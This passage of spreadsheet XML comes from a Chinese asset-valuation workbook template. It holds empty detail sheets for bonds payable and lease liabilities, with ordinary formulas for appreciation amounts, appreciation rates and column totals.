      <c r="O18" s="383" t="n"/>
    </row>
    <row r="19" ht="16.5" customFormat="1" customHeight="1" s="342">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="381" t="n"/>
      <c r="D19" s="578" t="n"/>
      <c r="E19" s="578" t="n"/>
      <c r="F19" s="380" t="n"/>
      <c r="G19" s="380" t="n"/>
      <c r="H19" s="555" t="n"/>
      <c r="I19" s="588" t="n"/>
      <c r="J19" s="560" t="n"/>
      <c r="K19" s="555" t="n"/>
      <c r="L19" s="555" t="n"/>
      <c r="M19" s="555">
        <f>L19-J19</f>
        <v/>
      </c>
      <c r="N19" s="555">
        <f>IF(J19=0,"",M19/J19*100)</f>
        <v/>
      </c>
      <c r="O19" s="383" t="n"/>
    </row>
    <row r="20" ht="16.5" customFormat="1" customHeight="1" s="342">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="381" t="n"/>
      <c r="D20" s="578" t="n"/>
      <c r="E20" s="578" t="n"/>
      <c r="F20" s="380" t="n"/>
      <c r="G20" s="380" t="n"/>
      <c r="H20" s="555" t="n"/>
      <c r="I20" s="588" t="n"/>
      <c r="J20" s="560" t="n"/>
      <c r="K20" s="555" t="n"/>
      <c r="L20" s="555" t="n"/>
      <c r="M20" s="555">
        <f>L20-J20</f>
        <v/>
      </c>
      <c r="N20" s="555">
        <f>IF(J20=0,"",M20/J20*100)</f>
        <v/>
      </c>
      <c r="O20" s="383" t="n"/>
    </row>
    <row r="21" ht="16.5" customFormat="1" customHeight="1" s="342">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="381" t="n"/>
      <c r="D21" s="578" t="n"/>
      <c r="E21" s="578" t="n"/>
      <c r="F21" s="380" t="n"/>
      <c r="G21" s="380" t="n"/>
      <c r="H21" s="555" t="n"/>
      <c r="I21" s="588" t="n"/>
      <c r="J21" s="560" t="n"/>
      <c r="K21" s="555" t="n"/>
      <c r="L21" s="555" t="n"/>
      <c r="M21" s="555">
        <f>L21-J21</f>
        <v/>
      </c>
      <c r="N21" s="555">
        <f>IF(J21=0,"",M21/J21*100)</f>
        <v/>
      </c>
      <c r="O21" s="383" t="n"/>
    </row>
    <row r="22" ht="16.5" customFormat="1" customHeight="1" s="342">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="381" t="n"/>
      <c r="D22" s="578" t="n"/>
      <c r="E22" s="578" t="n"/>
      <c r="F22" s="380" t="n"/>
      <c r="G22" s="380" t="n"/>
      <c r="H22" s="555" t="n"/>
      <c r="I22" s="588" t="n"/>
      <c r="J22" s="560" t="n"/>
      <c r="K22" s="555" t="n"/>
      <c r="L22" s="555" t="n"/>
      <c r="M22" s="555">
        <f>L22-J22</f>
        <v/>
      </c>
      <c r="N22" s="555">
        <f>IF(J22=0,"",M22/J22*100)</f>
        <v/>
      </c>
      <c r="O22" s="383" t="n"/>
    </row>
    <row r="23" ht="16.5" customFormat="1" customHeight="1" s="342">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="381" t="n"/>
      <c r="D23" s="578" t="n"/>
      <c r="E23" s="578" t="n"/>
      <c r="F23" s="380" t="n"/>
      <c r="G23" s="380" t="n"/>
      <c r="H23" s="555" t="n"/>
      <c r="I23" s="588" t="n"/>
      <c r="J23" s="560" t="n"/>
      <c r="K23" s="555" t="n"/>
      <c r="L23" s="555" t="n"/>
      <c r="M23" s="555">
        <f>L23-J23</f>
        <v/>
      </c>
      <c r="N23" s="555">
        <f>IF(J23=0,"",M23/J23*100)</f>
        <v/>
      </c>
      <c r="O23" s="383" t="n"/>
    </row>
    <row r="24" ht="16.5" customFormat="1" customHeight="1" s="342">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="381" t="n"/>
      <c r="D24" s="578" t="n"/>
      <c r="E24" s="578" t="n"/>
      <c r="F24" s="380" t="n"/>
      <c r="G24" s="380" t="n"/>
      <c r="H24" s="555" t="n"/>
      <c r="I24" s="588" t="n"/>
      <c r="J24" s="560" t="n"/>
      <c r="K24" s="555" t="n"/>
      <c r="L24" s="555" t="n"/>
      <c r="M24" s="555">
        <f>L24-J24</f>
        <v/>
      </c>
      <c r="N24" s="555">
        <f>IF(J24=0,"",M24/J24*100)</f>
        <v/>
      </c>
      <c r="O24" s="383" t="n"/>
    </row>
    <row r="25" ht="16.5" customFormat="1" customHeight="1" s="342">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="381" t="n"/>
      <c r="D25" s="578" t="n"/>
      <c r="E25" s="578" t="n"/>
      <c r="F25" s="380" t="n"/>
      <c r="G25" s="380" t="n"/>
      <c r="H25" s="555" t="n"/>
      <c r="I25" s="588" t="n"/>
      <c r="J25" s="560" t="n"/>
      <c r="K25" s="555" t="n"/>
      <c r="L25" s="555" t="n"/>
      <c r="M25" s="555">
        <f>L25-J25</f>
        <v/>
      </c>
      <c r="N25" s="555">
        <f>IF(J25=0,"",M25/J25*100)</f>
        <v/>
      </c>
      <c r="O25" s="383" t="n"/>
    </row>
    <row r="26" ht="16.5" customFormat="1" customHeight="1" s="342">
      <c r="A26" s="116" t="n"/>
      <c r="B26" s="380" t="n"/>
      <c r="C26" s="381" t="n"/>
      <c r="D26" s="578" t="n"/>
      <c r="E26" s="578" t="n"/>
      <c r="F26" s="380" t="n"/>
      <c r="G26" s="380" t="n"/>
      <c r="H26" s="555" t="n"/>
      <c r="I26" s="588" t="n"/>
      <c r="J26" s="560" t="n"/>
      <c r="K26" s="555" t="n"/>
      <c r="L26" s="555" t="n"/>
      <c r="M26" s="555">
        <f>L26-J26</f>
        <v/>
      </c>
      <c r="N26" s="555">
        <f>IF(J26=0,"",M26/J26*100)</f>
        <v/>
      </c>
      <c r="O26" s="383" t="n"/>
    </row>
    <row r="27" ht="16.5" customFormat="1" customHeight="1" s="342">
      <c r="A27" s="116" t="n"/>
      <c r="B27" s="380" t="n"/>
      <c r="C27" s="381" t="n"/>
      <c r="D27" s="578" t="n"/>
      <c r="E27" s="578" t="n"/>
      <c r="F27" s="380" t="n"/>
      <c r="G27" s="380" t="n"/>
      <c r="H27" s="555" t="n"/>
      <c r="I27" s="588" t="n"/>
      <c r="J27" s="560" t="n"/>
      <c r="K27" s="555" t="n"/>
      <c r="L27" s="555" t="n"/>
      <c r="M27" s="555">
        <f>L27-J27</f>
        <v/>
      </c>
      <c r="N27" s="555">
        <f>IF(J27=0,"",M27/J27*100)</f>
        <v/>
      </c>
      <c r="O27" s="383" t="n"/>
    </row>
    <row r="28" ht="16.5" customFormat="1" customHeight="1" s="342">
      <c r="A28" s="116" t="n"/>
      <c r="B28" s="380" t="n"/>
      <c r="C28" s="381" t="n"/>
      <c r="D28" s="578" t="n"/>
      <c r="E28" s="578" t="n"/>
      <c r="F28" s="380" t="n"/>
      <c r="G28" s="380" t="n"/>
      <c r="H28" s="555" t="n"/>
      <c r="I28" s="588" t="n"/>
      <c r="J28" s="560" t="n"/>
      <c r="K28" s="555" t="n"/>
      <c r="L28" s="555" t="n"/>
      <c r="M28" s="555">
        <f>L28-J28</f>
        <v/>
      </c>
      <c r="N28" s="555">
        <f>IF(J28=0,"",M28/J28*100)</f>
        <v/>
      </c>
      <c r="O28" s="383" t="n"/>
    </row>
    <row r="29" ht="16.5" customFormat="1" customHeight="1" s="342">
      <c r="A29" s="116" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B29" s="380" t="inlineStr">
        <is>
          <t>合            计</t>
        </is>
      </c>
      <c r="C29" s="567" t="n"/>
      <c r="D29" s="115" t="n"/>
      <c r="E29" s="115" t="n"/>
      <c r="F29" s="380" t="n"/>
      <c r="G29" s="380" t="n"/>
      <c r="H29" s="560">
        <f>ROUND(SUM(H6:H28),2)</f>
        <v/>
      </c>
      <c r="I29" s="596" t="n"/>
      <c r="J29" s="560">
        <f>ROUND(SUM(J6:J28),2)</f>
        <v/>
      </c>
      <c r="K29" s="560" t="n"/>
      <c r="L29" s="560">
        <f>ROUND(SUM(L6:L28),2)</f>
        <v/>
      </c>
      <c r="M29" s="555">
        <f>L29-J29</f>
        <v/>
      </c>
      <c r="N29" s="555">
        <f>IF(J29=0,"",M29/J29*100)</f>
        <v/>
      </c>
      <c r="O29" s="383" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="4">
    <mergeCell ref="B4:F4"/>
    <mergeCell ref="B1:O1"/>
    <mergeCell ref="B2:O2"/>
    <mergeCell ref="B29:C29"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:O29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73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 codeName="Sheet98">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:L29"/>
  <sheetViews>
    <sheetView showGridLines="0" view="pageBreakPreview" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="A27" sqref="A27"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="8.66666666666667" defaultRowHeight="15.2"/>
  <cols>
    <col width="13.5" customWidth="1" style="410" min="1" max="1"/>
    <col width="10.3333333333333" customWidth="1" style="410" min="2" max="2"/>
    <col width="25.6666666666667" customWidth="1" style="410" min="3" max="3"/>
    <col width="8.83333333333333" customWidth="1" style="410" min="4" max="4"/>
    <col width="9.66666666666667" customWidth="1" style="410" min="5" max="6"/>
    <col width="10.6666666666667" customWidth="1" style="410" min="7" max="7"/>
    <col width="15.6666666666667" customWidth="1" style="410" min="8" max="8"/>
    <col outlineLevel="1" width="15.6666666666667" customWidth="1" style="410" min="9" max="10"/>
    <col outlineLevel="1" width="8.66666666666667" customWidth="1" style="410" min="11" max="11"/>
    <col width="12.8333333333333" customWidth="1" style="410" min="12" max="12"/>
    <col width="8.66666666666667" customWidth="1" style="410" min="13" max="16384"/>
  </cols>
  <sheetData>
    <row r="1" ht="21" customFormat="1" customHeight="1" s="368">
      <c r="A1" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B1" s="118" t="inlineStr">
        <is>
          <t>应付债券评估明细表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376" t="n"/>
      <c r="C3" s="547" t="n"/>
      <c r="D3" s="547" t="n"/>
      <c r="E3" s="547" t="n"/>
      <c r="F3" s="547" t="n"/>
      <c r="G3" s="547" t="n"/>
      <c r="H3" s="547" t="n"/>
      <c r="I3" s="373" t="n"/>
      <c r="J3" s="373" t="n"/>
      <c r="K3" s="373" t="n"/>
      <c r="L3" s="402" t="inlineStr">
        <is>
          <t>表6-2</t>
        </is>
      </c>
    </row>
    <row r="4" ht="16.5" customHeight="1" s="41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376" t="n"/>
      <c r="K4" s="376" t="n"/>
      <c r="L4" s="402">
        <f>'2-分类汇总'!H4</f>
        <v/>
      </c>
    </row>
    <row r="5" ht="16.5" customHeight="1" s="415">
      <c r="A5" s="116" t="inlineStr">
        <is>
          <t>检索表头</t>
        </is>
      </c>
      <c r="B5" s="380" t="inlineStr">
        <is>
          <t>序号</t>
        </is>
      </c>
      <c r="C5" s="380" t="inlineStr">
        <is>
          <t>债券发行单位</t>
        </is>
      </c>
      <c r="D5" s="380" t="inlineStr">
        <is>
          <t>债券种类</t>
        </is>
      </c>
      <c r="E5" s="380" t="inlineStr">
        <is>
          <t>发生日期</t>
        </is>
      </c>
      <c r="F5" s="380" t="inlineStr">
        <is>
          <t>到期日</t>
        </is>
      </c>
      <c r="G5" s="380" t="inlineStr">
        <is>
          <t>票面利率%</t>
        </is>
      </c>
      <c r="H5" s="307" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="I5" s="380" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="J5" s="380" t="inlineStr">
        <is>
          <t>增值额</t>
        </is>
      </c>
      <c r="K5" s="380" t="inlineStr">
        <is>
          <t>增值率%</t>
        </is>
      </c>
      <c r="L5" s="380" t="inlineStr">
        <is>
          <t xml:space="preserve"> 备 注</t>
        </is>
      </c>
    </row>
    <row r="6" ht="16.5" customHeight="1" s="415">
      <c r="A6" s="116" t="n"/>
      <c r="B6" s="380" t="n"/>
      <c r="C6" s="381" t="n"/>
      <c r="D6" s="380" t="n"/>
      <c r="E6" s="578" t="n"/>
      <c r="F6" s="578" t="n"/>
      <c r="G6" s="380" t="n"/>
      <c r="H6" s="555" t="n"/>
      <c r="I6" s="555" t="n"/>
      <c r="J6" s="555">
        <f>I6-H6</f>
        <v/>
      </c>
      <c r="K6" s="555">
        <f>IF(H6=0,"",J6/H6*100)</f>
        <v/>
      </c>
      <c r="L6" s="383" t="n"/>
    </row>
    <row r="7" ht="16.5" customHeight="1" s="415">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="380" t="n"/>
      <c r="C7" s="381" t="n"/>
      <c r="D7" s="380" t="n"/>
      <c r="E7" s="578" t="n"/>
      <c r="F7" s="578" t="n"/>
      <c r="G7" s="380" t="n"/>
      <c r="H7" s="555" t="n"/>
      <c r="I7" s="555" t="n"/>
      <c r="J7" s="555">
        <f>I7-H7</f>
        <v/>
      </c>
      <c r="K7" s="555">
        <f>IF(H7=0,"",J7/H7*100)</f>
        <v/>
      </c>
      <c r="L7" s="383" t="n"/>
    </row>
    <row r="8" ht="16.5" customHeight="1" s="415">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="381" t="n"/>
      <c r="D8" s="380" t="n"/>
      <c r="E8" s="578" t="n"/>
      <c r="F8" s="578" t="n"/>
      <c r="G8" s="380" t="n"/>
      <c r="H8" s="560" t="n"/>
      <c r="I8" s="555" t="n"/>
      <c r="J8" s="555">
        <f>I8-H8</f>
        <v/>
      </c>
      <c r="K8" s="555">
        <f>IF(H8=0,"",J8/H8*100)</f>
        <v/>
      </c>
      <c r="L8" s="383" t="n"/>
    </row>
    <row r="9" ht="16.5" customHeight="1" s="415">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="381" t="n"/>
      <c r="D9" s="380" t="n"/>
      <c r="E9" s="578" t="n"/>
      <c r="F9" s="578" t="n"/>
      <c r="G9" s="380" t="n"/>
      <c r="H9" s="560" t="n"/>
      <c r="I9" s="555" t="n"/>
      <c r="J9" s="555">
        <f>I9-H9</f>
        <v/>
      </c>
      <c r="K9" s="555">
        <f>IF(H9=0,"",J9/H9*100)</f>
        <v/>
      </c>
      <c r="L9" s="383" t="n"/>
    </row>
    <row r="10" ht="16.5" customHeight="1" s="415">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="381" t="n"/>
      <c r="D10" s="380" t="n"/>
      <c r="E10" s="578" t="n"/>
      <c r="F10" s="578" t="n"/>
      <c r="G10" s="380" t="n"/>
      <c r="H10" s="560" t="n"/>
      <c r="I10" s="555" t="n"/>
      <c r="J10" s="555">
        <f>I10-H10</f>
        <v/>
      </c>
      <c r="K10" s="555">
        <f>IF(H10=0,"",J10/H10*100)</f>
        <v/>
      </c>
      <c r="L10" s="383" t="n"/>
    </row>
    <row r="11" ht="16.5" customHeight="1" s="415">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="381" t="n"/>
      <c r="D11" s="380" t="n"/>
      <c r="E11" s="578" t="n"/>
      <c r="F11" s="578" t="n"/>
      <c r="G11" s="380" t="n"/>
      <c r="H11" s="560" t="n"/>
      <c r="I11" s="555" t="n"/>
      <c r="J11" s="555">
        <f>I11-H11</f>
        <v/>
      </c>
      <c r="K11" s="555">
        <f>IF(H11=0,"",J11/H11*100)</f>
        <v/>
      </c>
      <c r="L11" s="383" t="n"/>
    </row>
    <row r="12" ht="16.5" customHeight="1" s="415">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="381" t="n"/>
      <c r="D12" s="380" t="n"/>
      <c r="E12" s="578" t="n"/>
      <c r="F12" s="578" t="n"/>
      <c r="G12" s="380" t="n"/>
      <c r="H12" s="560" t="n"/>
      <c r="I12" s="555" t="n"/>
      <c r="J12" s="555">
        <f>I12-H12</f>
        <v/>
      </c>
      <c r="K12" s="555">
        <f>IF(H12=0,"",J12/H12*100)</f>
        <v/>
      </c>
      <c r="L12" s="383" t="n"/>
    </row>
    <row r="13" ht="16.5" customHeight="1" s="415">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="381" t="n"/>
      <c r="D13" s="380" t="n"/>
      <c r="E13" s="578" t="n"/>
      <c r="F13" s="578" t="n"/>
      <c r="G13" s="380" t="n"/>
      <c r="H13" s="560" t="n"/>
      <c r="I13" s="555" t="n"/>
      <c r="J13" s="555">
        <f>I13-H13</f>
        <v/>
      </c>
      <c r="K13" s="555">
        <f>IF(H13=0,"",J13/H13*100)</f>
        <v/>
      </c>
      <c r="L13" s="383" t="n"/>
    </row>
    <row r="14" ht="16.5" customHeight="1" s="415">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="381" t="n"/>
      <c r="D14" s="380" t="n"/>
      <c r="E14" s="578" t="n"/>
      <c r="F14" s="578" t="n"/>
      <c r="G14" s="380" t="n"/>
      <c r="H14" s="560" t="n"/>
      <c r="I14" s="555" t="n"/>
      <c r="J14" s="555">
        <f>I14-H14</f>
        <v/>
      </c>
      <c r="K14" s="555">
        <f>IF(H14=0,"",J14/H14*100)</f>
        <v/>
      </c>
      <c r="L14" s="383" t="n"/>
    </row>
    <row r="15" ht="16.5" customHeight="1" s="415">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="381" t="n"/>
      <c r="D15" s="380" t="n"/>
      <c r="E15" s="578" t="n"/>
      <c r="F15" s="578" t="n"/>
      <c r="G15" s="380" t="n"/>
      <c r="H15" s="560" t="n"/>
      <c r="I15" s="555" t="n"/>
      <c r="J15" s="555">
        <f>I15-H15</f>
        <v/>
      </c>
      <c r="K15" s="555">
        <f>IF(H15=0,"",J15/H15*100)</f>
        <v/>
      </c>
      <c r="L15" s="383" t="n"/>
    </row>
    <row r="16" ht="16.5" customHeight="1" s="415">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="381" t="n"/>
      <c r="D16" s="380" t="n"/>
      <c r="E16" s="578" t="n"/>
      <c r="F16" s="578" t="n"/>
      <c r="G16" s="380" t="n"/>
      <c r="H16" s="560" t="n"/>
      <c r="I16" s="555" t="n"/>
      <c r="J16" s="555">
        <f>I16-H16</f>
        <v/>
      </c>
      <c r="K16" s="555">
        <f>IF(H16=0,"",J16/H16*100)</f>
        <v/>
      </c>
      <c r="L16" s="383" t="n"/>
    </row>
    <row r="17" ht="16.5" customHeight="1" s="415">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="381" t="n"/>
      <c r="D17" s="380" t="n"/>
      <c r="E17" s="578" t="n"/>
      <c r="F17" s="578" t="n"/>
      <c r="G17" s="380" t="n"/>
      <c r="H17" s="560" t="n"/>
      <c r="I17" s="555" t="n"/>
      <c r="J17" s="555">
        <f>I17-H17</f>
        <v/>
      </c>
      <c r="K17" s="555">
        <f>IF(H17=0,"",J17/H17*100)</f>
        <v/>
      </c>
      <c r="L17" s="383" t="n"/>
    </row>
    <row r="18" ht="16.5" customHeight="1" s="415">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="381" t="n"/>
      <c r="D18" s="380" t="n"/>
      <c r="E18" s="578" t="n"/>
      <c r="F18" s="578" t="n"/>
      <c r="G18" s="380" t="n"/>
      <c r="H18" s="560" t="n"/>
      <c r="I18" s="555" t="n"/>
      <c r="J18" s="555">
        <f>I18-H18</f>
        <v/>
      </c>
      <c r="K18" s="555">
        <f>IF(H18=0,"",J18/H18*100)</f>
        <v/>
      </c>
      <c r="L18" s="383" t="n"/>
    </row>
    <row r="19" ht="16.5" customHeight="1" s="415">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="381" t="n"/>
      <c r="D19" s="380" t="n"/>
      <c r="E19" s="578" t="n"/>
      <c r="F19" s="578" t="n"/>
      <c r="G19" s="380" t="n"/>
      <c r="H19" s="560" t="n"/>
      <c r="I19" s="555" t="n"/>
      <c r="J19" s="555">
        <f>I19-H19</f>
        <v/>
      </c>
      <c r="K19" s="555">
        <f>IF(H19=0,"",J19/H19*100)</f>
        <v/>
      </c>
      <c r="L19" s="383" t="n"/>
    </row>
    <row r="20" ht="16.5" customHeight="1" s="415">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="381" t="n"/>
      <c r="D20" s="380" t="n"/>
      <c r="E20" s="578" t="n"/>
      <c r="F20" s="578" t="n"/>
      <c r="G20" s="380" t="n"/>
      <c r="H20" s="560" t="n"/>
      <c r="I20" s="555" t="n"/>
      <c r="J20" s="555">
        <f>I20-H20</f>
        <v/>
      </c>
      <c r="K20" s="555">
        <f>IF(H20=0,"",J20/H20*100)</f>
        <v/>
      </c>
      <c r="L20" s="383" t="n"/>
    </row>
    <row r="21" ht="16.5" customHeight="1" s="415">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="381" t="n"/>
      <c r="D21" s="380" t="n"/>
      <c r="E21" s="578" t="n"/>
      <c r="F21" s="578" t="n"/>
      <c r="G21" s="380" t="n"/>
      <c r="H21" s="560" t="n"/>
      <c r="I21" s="555" t="n"/>
      <c r="J21" s="555">
        <f>I21-H21</f>
        <v/>
      </c>
      <c r="K21" s="555">
        <f>IF(H21=0,"",J21/H21*100)</f>
        <v/>
      </c>
      <c r="L21" s="383" t="n"/>
    </row>
    <row r="22" ht="16.5" customHeight="1" s="415">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="381" t="n"/>
      <c r="D22" s="380" t="n"/>
      <c r="E22" s="578" t="n"/>
      <c r="F22" s="578" t="n"/>
      <c r="G22" s="380" t="n"/>
      <c r="H22" s="560" t="n"/>
      <c r="I22" s="555" t="n"/>
      <c r="J22" s="555">
        <f>I22-H22</f>
        <v/>
      </c>
      <c r="K22" s="555">
        <f>IF(H22=0,"",J22/H22*100)</f>
        <v/>
      </c>
      <c r="L22" s="383" t="n"/>
    </row>
    <row r="23" ht="16.5" customHeight="1" s="415">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="381" t="n"/>
      <c r="D23" s="380" t="n"/>
      <c r="E23" s="578" t="n"/>
      <c r="F23" s="578" t="n"/>
      <c r="G23" s="380" t="n"/>
      <c r="H23" s="560" t="n"/>
      <c r="I23" s="555" t="n"/>
      <c r="J23" s="555">
        <f>I23-H23</f>
        <v/>
      </c>
      <c r="K23" s="555">
        <f>IF(H23=0,"",J23/H23*100)</f>
        <v/>
      </c>
      <c r="L23" s="383" t="n"/>
    </row>
    <row r="24" ht="16.5" customHeight="1" s="415">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="381" t="n"/>
      <c r="D24" s="380" t="n"/>
      <c r="E24" s="578" t="n"/>
      <c r="F24" s="578" t="n"/>
      <c r="G24" s="380" t="n"/>
      <c r="H24" s="560" t="n"/>
      <c r="I24" s="555" t="n"/>
      <c r="J24" s="555">
        <f>I24-H24</f>
        <v/>
      </c>
      <c r="K24" s="555">
        <f>IF(H24=0,"",J24/H24*100)</f>
        <v/>
      </c>
      <c r="L24" s="383" t="n"/>
    </row>
    <row r="25" ht="16.5" customHeight="1" s="415">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="381" t="n"/>
      <c r="D25" s="380" t="n"/>
      <c r="E25" s="578" t="n"/>
      <c r="F25" s="578" t="n"/>
      <c r="G25" s="380" t="n"/>
      <c r="H25" s="560" t="n"/>
      <c r="I25" s="555" t="n"/>
      <c r="J25" s="555">
        <f>I25-H25</f>
        <v/>
      </c>
      <c r="K25" s="555">
        <f>IF(H25=0,"",J25/H25*100)</f>
        <v/>
      </c>
      <c r="L25" s="383" t="n"/>
    </row>
    <row r="26" ht="16.5" customHeight="1" s="415">
      <c r="A26" s="116" t="n"/>
      <c r="B26" s="380" t="n"/>
      <c r="C26" s="381" t="n"/>
      <c r="D26" s="380" t="n"/>
      <c r="E26" s="578" t="n"/>
      <c r="F26" s="578" t="n"/>
      <c r="G26" s="380" t="n"/>
      <c r="H26" s="560" t="n"/>
      <c r="I26" s="555" t="n"/>
      <c r="J26" s="555">
        <f>I26-H26</f>
        <v/>
      </c>
      <c r="K26" s="555">
        <f>IF(H26=0,"",J26/H26*100)</f>
        <v/>
      </c>
      <c r="L26" s="383" t="n"/>
    </row>
    <row r="27" ht="16.5" customHeight="1" s="415">
      <c r="A27" s="116" t="n"/>
      <c r="B27" s="380" t="n"/>
      <c r="C27" s="381" t="n"/>
      <c r="D27" s="380" t="n"/>
      <c r="E27" s="578" t="n"/>
      <c r="F27" s="578" t="n"/>
      <c r="G27" s="380" t="n"/>
      <c r="H27" s="560" t="n"/>
      <c r="I27" s="555" t="n"/>
      <c r="J27" s="555">
        <f>I27-H27</f>
        <v/>
      </c>
      <c r="K27" s="555">
        <f>IF(H27=0,"",J27/H27*100)</f>
        <v/>
      </c>
      <c r="L27" s="383" t="n"/>
    </row>
    <row r="28" ht="16.5" customHeight="1" s="415">
      <c r="A28" s="116" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B28" s="380" t="inlineStr">
        <is>
          <t>合            计</t>
        </is>
      </c>
      <c r="C28" s="593" t="n"/>
      <c r="D28" s="567" t="n"/>
      <c r="E28" s="383" t="n"/>
      <c r="F28" s="380" t="n"/>
      <c r="G28" s="380" t="n"/>
      <c r="H28" s="555">
        <f>ROUND(SUM(H6:H27),2)</f>
        <v/>
      </c>
      <c r="I28" s="555">
        <f>ROUND(SUM(I6:I27),2)</f>
        <v/>
      </c>
      <c r="J28" s="555">
        <f>I28-H28</f>
        <v/>
      </c>
      <c r="K28" s="555">
        <f>IF(H28=0,"",J28/H28*100)</f>
        <v/>
      </c>
      <c r="L28" s="137" t="n"/>
    </row>
    <row r="29" ht="16.8" customHeight="1" s="415">
      <c r="A29" s="116" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="4">
    <mergeCell ref="B2:L2"/>
    <mergeCell ref="B28:D28"/>
    <mergeCell ref="B1:L1"/>
    <mergeCell ref="B4:E4"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:L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8" fitToHeight="0" blackAndWhite="1" horizontalDpi="300" verticalDpi="300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 codeName="Sheet99">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:K28"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="A7" sqref="A7:A27"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="9" customWidth="1" style="410" min="1" max="1"/>
    <col width="10.1666666666667" customWidth="1" style="410" min="2" max="2"/>
    <col width="24.3333333333333" customWidth="1" style="410" min="3" max="3"/>
    <col width="10.3333333333333" customWidth="1" style="410" min="4" max="5"/>
    <col width="10.5" customWidth="1" style="410" min="6" max="6"/>
    <col width="15.6666666666667" customWidth="1" style="410" min="7" max="7"/>
    <col outlineLevel="1" width="15.6666666666667" customWidth="1" style="410" min="8" max="9"/>
    <col outlineLevel="1" width="9.16666666666667" customWidth="1" style="410" min="10" max="10"/>
    <col width="12.6666666666667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租赁负债评估明细表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373" t="n"/>
      <c r="I3" s="373" t="n"/>
      <c r="J3" s="373" t="n"/>
      <c r="K3" s="402" t="inlineStr">
        <is>
          <t>表6-3</t>
        </is>
      </c>
    </row>
    <row r="4" ht="16.5" customHeight="1" s="41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554" t="n"/>
      <c r="G4" s="376" t="n"/>
      <c r="H4" s="376" t="n"/>
      <c r="I4" s="376" t="n"/>
      <c r="J4" s="376" t="n"/>
      <c r="K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到期日</t>
        </is>
      </c>
      <c r="F5" s="185" t="inlineStr">
        <is>
          <t>利率（%）</t>
        </is>
      </c>
      <c r="G5" s="185" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="H5" s="380" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="I5" s="380" t="inlineStr">
        <is>
          <t>增值额</t>
        </is>
      </c>
      <c r="J5" s="380" t="inlineStr">
        <is>
          <t>增值率%</t>
        </is>
      </c>
      <c r="K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4" t="n"/>
    </row>
    <row r="7" ht="16.5" customFormat="1" customHeight="1" s="204">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="380" t="n"/>
      <c r="C7" s="380" t="n"/>
      <c r="D7" s="578" t="n"/>
      <c r="E7" s="578" t="n"/>
      <c r="F7" s="380" t="n"/>
      <c r="G7" s="555" t="n"/>
      <c r="H7" s="555" t="n"/>
      <c r="I7" s="555">
        <f>H7-G7</f>
        <v/>
      </c>
      <c r="J7" s="555">
        <f>IF(G7=0,"",I7/G7*100)</f>
        <v/>
      </c>
      <c r="K7" s="380" t="n"/>
    </row>
    <row r="8" ht="16.5" customFormat="1" customHeight="1" s="204">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="380" t="n"/>
      <c r="D8" s="578" t="n"/>
      <c r="E8" s="578" t="n"/>
